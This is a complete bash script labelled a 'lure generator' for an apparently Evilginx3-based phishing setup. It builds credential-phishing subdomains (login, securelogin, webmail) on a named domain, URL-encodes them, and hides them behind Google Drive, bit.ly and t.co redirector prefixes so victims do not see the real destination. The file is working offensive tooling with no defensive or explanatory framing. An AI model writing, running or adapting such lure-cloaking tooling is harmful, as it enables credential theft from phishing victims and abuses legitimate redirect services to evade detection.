#!/bin/bash
# === LURE GENERATOR (ENTERPRISE-GRADE) ===
# Auto-generates phishing lures using redirectors + encoded subdomains

set -euo pipefail

### === CONFIG ===
DOMAIN="hrahra.org"
PHISHLETS=("login" "securelogin" "webmail")
REDIRECTORS=(
  "https://drive.google.com/uc?id="
  "https://bit.ly/create/"
  "https://t.co/redirect/"
)
TEMPLATE="https://%s.%s"
LURE_OUTPUT="/opt/posh-ai/evilginx3/data/lures.txt"

mkdir -p "$(dirname "$LURE_OUTPUT")"
: > "$LURE_OUTPUT"

log()   { echo -e "\033[1;36m[LUREGEN]\033[0m $*"; }
fatal() { echo -e "\033[1;31m[✘] $*" >&2; exit 1; }

### === ENCODER ===
generate_encoded_url() {
  local full_url="$1"
  python3 -c "import urllib.parse; print(urllib.parse.quote('''$full_url'''))"
}

### === GENERATE LURES ===
generate_lure_links() {
  log "Generating cloaked lure links:"
  for phishlet in "${PHISHLETS[@]}"; do
    local url
    url=$(printf "$TEMPLATE" "$phishlet" "$DOMAIN")
    encoded=$(generate_encoded_url "$url")

    echo "Direct : $url" >> "$LURE_OUTPUT"
    for redirector in "${REDIRECTORS[@]}"; do
      echo "Via ${redirector%%/*}: ${redirector}${encoded}" >> "$LURE_OUTPUT"
    done
    echo "---" >> "$LURE_OUTPUT"
  done
}

generate_lure_links
log "✅ Lure generation complete → $LURE_OUTPUT"
